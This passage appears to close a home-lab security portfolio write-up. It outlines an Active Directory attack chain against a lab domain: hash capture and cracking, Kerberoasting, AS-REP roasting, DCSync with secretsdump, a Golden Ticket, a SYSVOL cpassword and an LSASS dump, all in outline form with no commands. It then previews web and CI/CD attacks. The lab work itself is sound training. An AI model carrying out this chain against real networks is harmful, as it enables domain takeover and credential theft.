    → Captures Administrator NTLMv2 hash
    → Cracks to CorpWin2025
    → evil-winrm shell on DC01 as Administrator
    → secretsdump dumps ALL hashes (Administrator, krbtgt, jsmith, jdoe, svc-jenkins)
    → Golden Ticket forged from krbtgt hash
    → psexec SYSTEM shell via forged ticket
    ↓
    Also captured: jsmith hash (during relay attempt in ATK-002)

[ATK-002] SMB Relay blocked by DC01 signing
    → Fallback: jsmith NTLMv2 captured
    → Cracks to Password123!
    → jsmith credential now available for everything below
    ↓

[ATK-003] jsmith requests TGS for svc-jenkins SPN
    → TGS encrypted with svc-jenkins hash
    → Offline crack: Service@2025!
    → evil-winrm as svc-jenkins
    ↓

[ATK-004] jsmith requests AS-REP for jdoe
    → jdoe has pre-auth disabled
    → AS-REP hash cracked: Password123!
    → ACL discovery: jdoe has GenericAll over jsmith
    ↓

[ATK-005] bloodhound-python collects everything as jsmith
    → BloodHound maps: jdoe→GenericAll→jsmith→GetChanges→Domain Admins
    → Confirms DCSync path via jsmith
    → Also finds: DC01 unconstraineddelegation=true (ATK-008 backlog)
    ↓

[ATK-006] secretsdump as jsmith (GetChanges ACL)
    → Full NTDS.DIT replication
    → Every hash, every Kerberos key in the domain
    → Redundant path to Administrator (already had it from ATK-001)
    → But demonstrates: regular user + misconfigured ACL = full domain compromise
    ↓

[ATK-007] jsmith browses SYSVOL
    → Finds Groups.xml with cpassword
    → Decrypts: CorpAdmin2025!
    → Local admin on all workstations
    → LSASS dump on WIN11-PC → any cached domain credentials
```

**The uncomfortable truth:** After ATK-001, the domain was already fully compromised. ATK-002 through ATK-007 demonstrate that **there were seven different paths to domain compromise** — each one exploiting a different misconfiguration, each one requiring only a regular user account to initiate.

Fixing one misconfiguration doesn't fix the others. Defense requires closing all of them simultaneously — which is exactly what Sprint 4 hardening addresses.

---

## What's Next

**Sprint 2 — Web App + CI/CD Attacks**

The attack surface shifts from Active Directory to the application layer. New targets, new tools, new detection gaps.

```
prod-vm:3000  — OWASP Juice Shop (Node.js, Docker)
jenkins:8080  — Jenkins CI/CD server
```

New techniques: SQLi, XSS, JWT attacks, IDOR, brute force, Jenkins RCE via Groovy console, Docker socket escape.

New detection challenge: application logs don't flow to Splunk by default. Sprint 2 starts with the visibility gap and closes it mid-sprint — then hunts retrospectively.

**Sprints remaining:**
```
S2 ⬅ Web App + CI/CD Attacks
S3    Developer / DevSecOps — fix the app, secure the pipeline
S4    Hardening + Python Automation — close all VIS gaps, build tooling
S5    AI Layer — RAG + agentic SOC analyst
S6    Purple Team + Portfolio
```

---

*CorpLab Sprint 1 — corp.local | 2026*  
*GitHub: https://github.com/kareymabualfadel/CorpLab*
